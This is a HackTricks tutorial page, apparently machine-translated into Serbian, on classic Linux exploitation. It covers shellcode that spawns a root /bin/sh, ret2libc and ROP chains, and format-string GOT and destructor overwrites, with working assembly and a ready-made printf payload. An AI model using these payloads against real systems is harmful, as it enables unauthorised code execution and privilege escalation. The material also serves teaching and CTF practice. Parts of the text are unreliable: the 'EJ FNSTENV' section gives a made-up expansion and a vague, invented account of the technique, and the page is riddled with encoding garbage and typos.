# Linux Exploiting (Osnovno) (SRB)

## Linux Exploiting (Osnovno) (SRB)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **ASLR**

Aleatorizacija adresa

**Iskljuƒçivanje globalne aleatorizacije (ASLR) (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Ponovno ukljuƒçivanje globalne aleatorizacije: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Iskljuƒçivanje za jedno izvr≈°avanje** (ne zahteva root):\
setarch \`arch\` -R ./primer argumenti\
setarch \`uname -m\` -R ./primer argumenti

**Iskljuƒçivanje za≈°titne izvr≈°ne za≈°tite na steku**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack primer.c -o primer

**Core fajl**\
ulimit -c unlimited\
gdb /exec core\_fajl\
/etc/security/limits.conf -> \* soft core unlimited

**Tekst**\
**Podaci**\
**BSS**\
**Heap**

**Stek**

**BSS sekcija**: Globalne ili statiƒçke neinicijalizovane promenljive
```
static int i;
```
**Odeljak DATA**: Globalne ili statiƒçke inicijalizovane promenljive
```
int i = 5;
```
**Odeljak TEXT**: Uputstva za kod (opkodovi)

**Odeljak HEAP**: Dinamiƒçki rezervisani baferi (malloc(), calloc(), realloc())

**Odeljak STACK**: Stog (prosleƒëeni argumenti, okru≈æenje niske (env), lokalne promenljive...)

## **1. STACK PREKORAƒåENJA**

> prekoraƒçenje bafera, prekoraƒçenje stoga, prekoraƒçenje steka, uni≈°tavanje steka

Segmentacija gre≈°ke ili segmentacija kr≈°enja: Kada se poku≈°a pristupiti memorijskoj adresi koja nije dodeljena procesu.

Da biste dobili adresu funkcije unutar programa, mo≈æete koristiti:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Poziv na sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Pregledajte prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; ƒçistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleƒëivanje\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Izvr≈°avanje syscall-a

**nasm -f elf assembly.asm** ‚Äî> Vraƒáa .o datoteku\
**ld assembly.o -o shellcodeout** ‚Äî> Daje izvr≈°nu datoteku sastavljenu od asemblerskog koda i mo≈æemo izvuƒái opkodove pomoƒáu **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Da bismo videli da je to zaista na≈°a shellcode i izvukli opkode

**Proverite da li shellcode radi**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Da biste videli da li sistemski pozivi pravilno funkcioni≈°u, trebate da kompajlirate prethodni program i sistemski pozivi trebaju biti prikazani u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-a mo≈æe se koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodaje EIP na stek. Nakon instrukcije poziva, ubacili smo string koji nam je potreban, tako da sa tim EIP-om mo≈æemo pokazati na string i nastaviti izvr≈°avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Kori≈°ƒáenje Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

EJ FNSTENV (Execute Jump Far Not Save Environment) je tehnika koja se koristi za iskori≈°ƒáavanje ranjivosti u Linux operativnom sistemu. Ova tehnika se koristi za preuzimanje kontrole nad ciljanim sistemom.

Kada se koristi EJ FNSTENV tehnika, napadaƒç mo≈æe da iskoristi ranjivost u ciljanom sistemu kako bi izvr≈°io zlonamerni kod. Ova tehnika se ƒçesto koristi za eskalaciju privilegija, omoguƒáavajuƒái napadaƒçu da dobije superkorisniƒçke privilegije na ciljanom sistemu.

Da bi se izvr≈°ila EJ FNSTENV tehnika, napadaƒç mora da pronaƒëe ranjivost u ciljanom sistemu koja omoguƒáava izvr≈°avanje koda. Nakon toga, napadaƒç mo≈æe da iskoristi tu ranjivost kako bi preuzeo kontrolu nad sistemom.

Va≈æno je napomenuti da je EJ FNSTENV tehnika ilegalna i da se koristi samo u okviru etiƒçkog hakovanja ili pentestiranja sistema uz dozvolu vlasnika sistema. Upotreba ove tehnike bez dozvole mo≈æe imati ozbiljne pravne posledice.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Ovo je mali kod koji pretra≈æuje stranice memorije povezane sa procesom u potrazi za shellcode-om koji je tamo spremljen (tra≈æi neki potpis koji je postavljen u shellcode-u). Korisno u sluƒçajevima kada imate samo malo prostora za ubrizgavanje koda.

**Polimorfni shellkodovi**

To su ≈°ifrirani shellkodovi koji imaju mali kod koji ih de≈°ifruje i skoƒçi na njega, koristeƒái trik Call-Pop. Evo jednog primjera ≈°ifriranog Cezarovog ≈°ifriranja:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Napad na Frame Pointer (EBP)**

Koristan u situaciji kada mo≈æemo izmeniti EBP, ali ne i EIP.

Poznato je da se prilikom izlaska iz funkcije izvr≈°ava sledeƒái asemblerski kod:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Na ovaj naƒçin, mo≈æe se promeniti EBP prilikom izlaska iz funkcije (fvuln) koja je pozvana iz druge funkcije, tako da kada funkcija koja je pozvala fvuln zavr≈°i, njen EIP mo≈æe biti promenjen.

U fvuln se mo≈æe uneti la≈æni EBP koji pokazuje na mesto gde se nalazi adresa shellcode + 4 (treba dodati 4 zbog pop). Na taj naƒçin, prilikom izlaska iz funkcije, vrednost &(\&Shellcode)+4 ƒáe biti sme≈°tena u ESP, sa pop ƒáe se oduzeti 4 od ESP i on ƒáe pokazivati na adresu shellcode kada se izvr≈°i ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + padding + &(\&Shellcode)+4

**Off-by-One Exploit**\
Dozvoljava se samo promena najmanje znaƒçajnog bajta EBP-a. Mo≈æe se izvesti napad kao i prethodni, ali memorija koja ƒçuva adresu shellcode-a mora deliti prva 3 bajta sa EBP-om.

## **4. Metode povratka na Libc**

Koristan metod kada stek nije izvr≈°iv ili ostavlja vrlo malo prostora za modifikaciju.

ASLR uzrokuje da se funkcije uƒçitavaju na razliƒçite pozicije u memoriji pri svakom izvr≈°avanju. Stoga ovaj metod mo≈æe biti neefikasan u tom sluƒçaju. Za udaljene servere, buduƒái da se program stalno izvr≈°ava na istoj adresi, ovaj metod mo≈æe biti koristan.

* **cdecl (C deklaracija)** Stavlja argumente na stek i nakon izlaska iz funkcije ƒçisti stek
* **stdcall (standardni poziv)** Stavlja argumente na stek i funkcija koja je pozvana ƒçisti stek
* **fastcall** Stavlja prva dva argumenta u registre, a ostale na stek

Postavlja se adresa system instrukcije iz libc-a i prosleƒëuje se kao argument string "/bin/sh", obiƒçno iz okoline. Takoƒëe se koristi adresa exit funkcije kako bi se program bez problema zavr≈°io kada vi≈°e nije potrebna shell (i zapisivanje logova).

**export SHELL=/bin/sh**

Da biste prona≈°li potrebne adrese, mo≈æete pogledati unutar **GDB-a:**\
**p system**\
**p exit**\
**rabin2 -i izvr≈°na_datoteka** ‚Äî> Daje adresu svih funkcija koje program koristi pri uƒçitavanju\
(Unutar starta ili nekog prekida): **x/500s $esp** ‚Äî> Tra≈æimo unutar ovoga string /bin/sh

Kada imamo ove adrese, **exploit** bi izgledao ovako:

"A" \* DISTANCA EBP + 4 (EBP: mogu biti 4 "A" ali bolje je ako je pravi EBP da se izbegnu segmentacijske gre≈°ke) + Adresa **system** (prepisuje EIP) + Adresa **exit** (nakon izvr≈°avanja system("/bin/sh") ova funkcija ƒáe se pozvati jer su prva 4 bajta na steku tretirana kao sledeƒáa adresa EIP-a koja ƒáe se izvr≈°iti) + Adresa "**/bin/sh**" (biƒáe prosleƒëen parametar system-u)

Na ovaj naƒçin ƒáe se EIP prepisati adresom system koja ƒáe primiti string "/bin/sh" kao argument, a nakon izlaska iz toga izvr≈°iƒáe se funkcija exit().

Moguƒáe je da se naƒëete u situaciji da je neki bajt neke adrese neaktivan ili prazan (\x20). U tom sluƒçaju mo≈æete dezasemblirati prethodne adrese do te funkcije jer ƒáe verovatno biti nekoliko NOP-ova koji ƒáe nam omoguƒáiti da pozovemo neki od njih umesto same funkcije (na primer sa > x/8i system-4).

Ovaj metod funkcioni≈°e jer kada se funkcija kao ≈°to je system poziva koristeƒái opcode **ret** umesto **call**, funkcija shvata da ƒáe prva 4 bajta biti adresa **EIP** na koju ƒáe se vratiti.

Interesantna tehnika sa ovim metod je pozivanje **strncpy()** da bi se prebacio payload sa steka na hip i zatim koristio **gets()** da se izvr≈°i taj payload.

Jo≈° jedna interesantna tehnika je kori≈°ƒáenje **mprotect()** koja omoguƒáava dodeljivanje ≈æeljenih dozvola bilo kojem delu memorije. Radi ili je radila na BDS-u, MacOS-u i OpenBSD-u, ali ne i na Linuxu (kontroli≈°e da ne mo≈æe biti dodeljeno istovremeno pisanje i izvr≈°avanje). Pomoƒáu ovog napada moglo bi se ponovo konfigurisati izvr≈°avanje steka.

**Povezivanje funkcija**

Na osnovu prethodne tehnike, ovaj oblik exploit-a sastoji se od:\
Padding + \&Funkcija1 + \&pop;ret; + \&arg\_fun1 + \&Funkcija2 + \&pop;ret; + \&arg\_fun2 + ...

Na ovaj naƒçin mogu se povezati funkcije koje ƒáe biti pozvane. Takoƒëe, ako ≈æelite koristiti funkcije sa vi≈°e argumenata, mo≈æete postaviti potrebne argumente (npr. 4) i postaviti 4 argumenta i pronaƒái adresu sa opcodima: pop, pop, pop, pop, ret ‚Äî> **objdump -d izvr≈°na_datoteka**

**Povezivanje putem la≈ænih okvira (povezivanje EBPa)**

Ovo se sastoji od iskori≈°ƒáavanja moguƒánosti manipulacije EBP-om kako bi se povezalo izvr≈°avanje vi≈°e funkcija putem EBP-a i "leave;ret"

PADDING

* Postavljamo la≈æni EBP u EBP koji pokazuje na: 2. la≈æni EBP + funkcija za izvr≈°avanje: (\&system() + \&leave;ret + &"/bin/sh")
* U EIP postavljamo adresu funkcije &(leave;ret)

Pokreƒáemo shellcode sa adresom sledeƒáeg dela shellcode-a, na primer: 2. la≈æni EBP + \&system() + &(leave;ret;) + &"/bin/sh"

2. la≈æni EBP bi bio: 3. la≈æni EBP + \&system() + &(leave;ret;) + &"/bin/ls"

Ovaj shellcode se mo≈æe ponavljati beskonaƒçno puta na delovima memorije do kojih se ima pristup, tako da se dobija shellcode koji se lako deli na male delove memorije.

(Izvr≈°avanje funkcija se povezuje me≈°anjem ranije viƒëenih ranjivosti EBP-a i ret2lib) 

## **5. Dodatne metode**

**Ret2Ret**

Koristan kada nije moguƒáe staviti adresu sa steka u EIP (proverava se da EIP ne sadr≈æi 0xbf) ili kada nije moguƒáe izraƒçunati lokaciju shellcode-a. Ali, ranjiva funkcija prihvata jedan parametar (shellcode ƒáe biti ovde).

Na ovaj naƒçin, menjanjem EIP-a sa adresom **ret**, uƒçitaƒáe se sledeƒáa adresa (koja je adresa prvog argumenta funkcije). Drugim reƒçima, uƒçitaƒáe se shellcode.

Exploit bi izgledao ovako: SHELLCODE + Padding (do EIP-a) + **\&ret** (sledeƒái bajtovi na steku pokazuju na poƒçetak shellcode-a jer se na stek stavlja adresa prosleƒëenog parametra)

Izgleda da funkcije poput **strncpy** nakon zavr≈°etka bri≈°u sa steka adresu na kojoj je ƒçuvan shellcode, ≈°to onemoguƒáava ovu tehniku. Drugim reƒçima, adresa koju funkcija prosleƒëuje kao argument (ona koja ƒçuva shellcode) se menja u 0x00, pa kada se pozove drugi **ret**, naiƒëe se na 0x00 i program se prekida.
```
**Ret2PopRet**
```
Ako nemamo kontrolu nad prvom argumentu, ali imamo nad drugim ili treƒáim, mo≈æemo prepisati EIP sa adresom pop-ret ili pop-pop-ret, u zavisnosti od potrebe.

**Muratova tehnika**

Na Linuxu, svi programi se mapiraju poƒçev≈°i od 0xbfffffff.

Gledajuƒái kako se konstrui≈°e stek novog procesa na Linuxu, mo≈æe se razviti exploit tako da program bude pokrenut u okru≈æenju koje ima samo jednu promenljivu - shellcode. Adresa ove promenljive se mo≈æe izraƒçunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

Na ovaj naƒçin se lako dobija adresa gde se nalazi promenljiva okru≈æenja sa shellcode-om.

Ovo je moguƒáe zahvaljujuƒái funkciji execle koja omoguƒáava kreiranje okru≈æenja koje ima samo ≈æeljene promenljive okru≈æenja.

**Skok na ESP: Windows stil**

Buduƒái da ESP uvek pokazuje na poƒçetak steka, ova tehnika se sastoji od zamene EIP sa adresom poziva na **jmp esp** ili **call esp**. Na ovaj naƒçin, shellcode se ƒçuva nakon prepisivanja EIP jer ƒáe se nakon izvr≈°avanja **ret** ESP nalaziti na sledeƒáoj adresi, taƒçno gde je shellcode saƒçuvan.

U sluƒçaju da ASLR nije aktiviran na Windowsu ili Linuxu, mo≈æe se pozvati **jmp esp** ili **call esp** koji su sme≈°teni u nekom deljenom objektu. Ako je ASLR aktiviran, mo≈æe se potra≈æiti unutar samog ranjivog programa.

Takoƒëe, ƒçinjenica da se shellcode mo≈æe postaviti nakon korupcije EIP-a umesto u sredini steka omoguƒáava da push ili pop instrukcije koje se izvr≈°avaju u sredini funkcije ne dodiruju shellcode (≈°to bi se moglo dogoditi ako bi se postavio u sredinu steka funkcije).

Na vrlo sliƒçan naƒçin, ako znamo da funkcija vraƒáa adresu gde je shellcode saƒçuvan, mo≈æe se pozvati **call eax** ili **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) ili pozajmljeni delovi koda**

Delovi koda koji se pozivaju nazivaju se gadgets.

Ova tehnika se sastoji od povezivanja razliƒçitih poziva funkcija putem tehnike **ret2libc** i kori≈°ƒáenja **pop,ret**.

Na nekim arhitekturama procesora, svaka instrukcija je skup od 32 bita (npr. MIPS). Meƒëutim, na Intelu su instrukcije promenljive veliƒçine i vi≈°e instrukcija mo≈æe deliti skup bitova, na primer:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Sadr≈æi bajtove 0xffe4 koji se takoƒëe prevode kao: **jmp \*%esp**

Na ovaj naƒçin se mogu izvr≈°iti neke instrukcije koje ƒçak nisu ni u originalnom programu.

**ROPgadget.py** nam poma≈æe da pronaƒëemo vrednosti u binarnim fajlovima.

Ovaj program takoƒëe slu≈æi za kreiranje **payload-a**. Mo≈æete mu dati biblioteku iz koje ≈æelite izvuƒái ROP-ove i on ƒáe generisati payload u Pythonu, gde mu samo dajete adresu na kojoj se ta biblioteka nalazi i payload je spreman za upotrebu kao shellcode. Osim toga, po≈°to koristi sistemski pozive, ne izvr≈°ava ni≈°ta stvarno na steku, veƒá samo ƒçuva adrese ROP-ova koje ƒáe se izvr≈°iti putem **ret** instrukcije. Da biste koristili ovaj payload, morate pozvati payload putem **ret** instrukcije.

**Prekoraƒçenje celobrojnih vrednosti**

Ova vrsta prekoraƒçenja se javlja kada promenljiva nije spremna da podr≈æi tako veliki broj koji joj se prosleƒëuje, mo≈æda zbog zabune izmeƒëu promenljivih sa i bez znaka, na primer:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
U prethodnom primeru vidimo da program oƒçekuje 2 parametra. Prvi je du≈æina sledeƒáeg niza, a drugi je niz.

Ako prosledimo negativan broj kao prvi parametar, dobiƒáemo da je len < 256 i proƒái ƒáemo taj filter, a takoƒëe ƒáe strlen(buffer) biti manji od l, jer je l unsigned int i biƒáe veoma velik.

Ova vrsta prekoraƒçenja ne poku≈°ava da ne≈°to napi≈°e u procesu programa, veƒá da prevaziƒëe lo≈°e dizajnirane filtere kako bi iskoristila druge ranjivosti.

**Nepoƒçetne promenljive**

Nije poznata vrednost koju mo≈æe imati nepoƒçetna promenljiva i mo≈æe biti interesantno posmatrati je. Mo≈æe se desiti da uzme vrednost koju je uzela promenljiva iz prethodne funkcije i da je kontrolira napadaƒç.

## **Formatiranje stringova**

U C-u, **`printf`** je funkcija koja se mo≈æe koristiti za **ispisivanje** nekog stringa. **Prvi parametar** koji ova funkcija oƒçekuje je **sirovi tekst sa formatiranjem**. **Sledeƒái parametri** koji se oƒçekuju su **vrednosti** koje ƒáe **zameniti formatere** iz sirovog teksta.

Ranjivost se javlja kada **napadaƒçev tekst bude postavljen kao prvi argument** ovoj funkciji. Napadaƒç ƒáe moƒái da kreira **poseban unos zloupotrebom moguƒánosti formatiranja printf-a** kako bi **upisao bilo koje podatke na bilo koju adresu**. Na taj naƒçin ƒáe biti u moguƒánosti da **izvr≈°i proizvoljni kod**.

Formati:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **upisuje** **broj upisanih bajtova** na **naznaƒçenoj adresi. Upisivanje** toliko **bajtova** koliko je heksadecimalni broj koji **≈æelimo** da upi≈°emo je naƒçin da **upi≈°emo bilo koje podatke**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Globalna tabela ofseta) / PLT (Tabela vezivanja postupaka)

Ovo je tabela koja sadr≈æi **adresu** **spoljnih funkcija** koje koristi program.

Dobijte adresu ove tabele sa: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Primetite kako nakon **uƒçitavanja** izvr≈°nog fajla u GEF-u mo≈æete **videti** funkcije koje se nalaze u GOT-u: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Koristeƒái GEF, mo≈æete **pokrenuti** sesiju **debugovanja** i izvr≈°iti **`got`** da biste videli got tabelu:

![](<../../.gitbook/assets/image (621).png>)

U binarnom fajlu GOT ima **adrese funkcija ili** odeljak **PLT** koji ƒáe uƒçitati adresu funkcije. Cilj ovog napada je **zamena unosa u GOT-u** funkcije koja ƒáe biti izvr≈°ena kasnije **sa** adresom PLT-a **`system`** **funkcije**. Idealno, zamena ƒáe se desiti u GOT-u funkcije koja ƒáe biti **pozvana sa parametrima koje kontroli≈°ete** (tako da ƒáete moƒái da kontroli≈°ete parametre poslate funkciji system).

Ako **`system`** **nije kori≈°ƒáen** u skripti, funkcija system **neƒáe** imati unos u GOT-u. U ovom scenariju, **prvo ƒáete morati da otkrijete adresu** funkcije `system`.

**Tabela vezivanja postupaka** je **samo za ƒçitanje** tabela u ELF fajlu koja ƒçuva sve neophodne **simbole koji zahtevaju razre≈°enje**. Kada se pozove jedna od ovih funkcija, **GOT** ƒáe **preusmeriti** **tok** na **PLT** kako bi mogao da **razre≈°i** **adresu** funkcije i upi≈°e je u GOT.\
Zatim, **sledeƒái put** kada se pozove ta adresa, **funkcija** se **poziva direktno** bez potrebe za razre≈°enjem.

Mo≈æete videti adrese PLT-a sa **`objdump -j .plt -d ./vuln_binary`**

### **Tok napada**

Kao ≈°to je obja≈°njeno ranije, cilj ƒáe biti **zamena adrese** funkcije u GOT tabeli koja ƒáe biti pozvana kasnije. Idealno bi bilo postaviti **adresu na shell kod** koji se nalazi u izvr≈°nom odeljku, ali je vrlo verovatno da neƒáete moƒái da napi≈°ete shell kod u izvr≈°nom odeljku.\
Zato je druga opcija da **zamenite funkciju** koja **prima** svoje **argumente** od **korisnika** i **usmerite** je na **`system`** **funkciju**.

Da biste napisali adresu, obiƒçno se koriste 2 koraka: Prvo **pi≈°ete 2 bajta** adrese, a zatim druga 2. Za to se koristi **`$hn`**.

**HOB** se odnosi na 2 vi≈°a bajta adrese\
**LOB** se odnosi na 2 ni≈æa bajta adrese

Dakle, zbog toga kako format string radi, prvo morate **napisati manji** od \[HOB, LOB] i zatim drugi.

Ako je HOB < LOB\
`[adresa+2][adresa]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ako je HOB > LOB\
`[adresa+2][adresa]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **≈†ablon za napad format stringom**

Mo≈æete pronaƒái **≈°ablon** za napad na GOT kori≈°ƒáenjem format stringova ovde:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essentially this is a structure with **functions that will be called** before the program finishes. This is interesting if you can call your **shellcode just jumping to an address**, or in cases where you need to go back to main again to **exploit the format string a second time**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Napomena da ovo **neƒáe** **stvoriti** beskonaƒçnu petlju jer kada se vratite na glavnu funkciju, kanarinci ƒáe primetiti da je kraj steka mo≈æda o≈°teƒáen i funkcija se neƒáe ponovo pozivati. Dakle, sa ovim ƒáete moƒái da **izvr≈°ite jo≈° jedan** napad na ranjivost.

### **Formatiranje stringova za ispis sadr≈æaja**

Formatiranje stringova takoƒëe se mo≈æe zloupotrebiti za **ispisivanje sadr≈æaja** iz memorije programa.\
Na primer, u sledeƒáoj situaciji postoji **lokalna promenljiva na steku koja pokazuje na zastavicu**. Ako **pronaƒëete** gde se u **memoriji** nalazi **pokazivaƒç** na **zastavicu**, mo≈æete naterati **printf da pristupi** toj **adresi** i **ispise** zastavicu:

Dakle, zastavica je na **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Iz curenja mo≈æete videti da je **pokazivaƒç na zastavicu** u **osmom** parametru:

![](<../../.gitbook/assets/image (623).png>)

Dakle, **pristupanjem** **osmom parametru** mo≈æete dobiti zastavicu:

![](<../../.gitbook/assets/image (624).png>)

Napomena da nakon **prethodnog napada** i shvatanja da mo≈æete **procureti sadr≈æaj**, mo≈æete **postaviti pokazivaƒçe** na **`printf`** na sekciju gde je **uƒçitana** izvr≈°na datoteka i **potpuno je iscuriti**!

### **DTOR**

{% hint style="danger" %}
Danas je vrlo **ƒçudno pronaƒái binarnu datoteku sa sekcijom dtor**.
{% endhint %}

Destruktori su funkcije koje se **izvr≈°avaju pre zavr≈°etka programa**.\
Ako uspete da **upi≈°ete adresu** ≈°el koda u **`__DTOR_END__`**, to ƒáe se **izvr≈°iti** pre nego ≈°to program zavr≈°i.\
Dobijte adresu ove sekcije sa:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Obiƒçno ƒáete pronaƒái **DTOR** sekciju **izmeƒëu** vrednosti `ffffffff` i `00000000`. Dakle, ako vidite samo te vrednosti, to znaƒçi da **nema registrovane funkcije**. Dakle, **prepi≈°ite** **`00000000`** sa **adresom** do **shell koda** kako biste ga izvr≈°ili.

### **Formatiranje stringova za preplavljivanje bafera**

**sprintf** funkcija kopira formatirani string u promenljivu. Stoga, mo≈æete iskoristiti formatiranje stringa da izazovete preplavljivanje bafera u promenljivoj gde se kopira sadr≈æaj. Na primer, payload `%.44xAAAA` ƒáe **upisati 44B+"AAAA" u promenljivu**, ≈°to mo≈æe izazvati preplavljivanje bafera.

### **\_\_atexit strukture**

{% hint style="danger" %}
Danas je vrlo **neobiƒçno iskoristiti ovo**.
{% endhint %}

**`atexit()`** je funkcija kojoj se **drugaƒçije funkcije prosleƒëuju kao parametri**. Ove **funkcije** ƒáe biti **izvr≈°ene** prilikom izvr≈°avanja **`exit()`** ili **povratka** iz **main** funkcije.\
Ako mo≈æete **izmeniti adresu** bilo koje od ovih **funkcija** da pokazuje na shell kod na primer, dobiƒáete kontrolu nad procesom, ali to je trenutno komplikovanije.\
Trenutno su **adrese funkcija** koje treba izvr≈°iti **sakrivene** iza nekoliko struktura i na kraju adresa na koju pokazuju nije adresa funkcija, veƒá su **≈°ifrovane sa XOR** i pomerene sa **sluƒçajnim kljuƒçem**. Tako da je trenutno ovaj vektor napada **nije vrlo koristan, barem na x86** i **x64\_86**.\
**Funkcija za ≈°ifrovanje** je **`PTR_MANGLE`**. **Druge arhitekture** kao ≈°to su m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju funkciju za ≈°ifrovanje** jer **vraƒáaju isto** ≈°to su primile kao ulaz. Dakle, ove arhitekture bi bile podlo≈æne ovom vektoru napada.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Danas je vrlo **neobiƒçno iskoristiti ovo**.
{% endhint %}

**`Setjmp()`** omoguƒáava da se **saƒçuva** **kontekst** (registri)\
**`longjmp()`** omoguƒáava da se **obnovi** **kontekst**.\
**Saƒçuvani registri** su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono ≈°to se de≈°ava je da se EIP i ESP prosleƒëuju kroz funkciju **`PTR_MANGLE`**, tako da su **arhitekture koje su podlo≈æne ovom napadu iste kao i prethodno navedene**.\
Koriste se za oporavak od gre≈°aka ili prekida.\
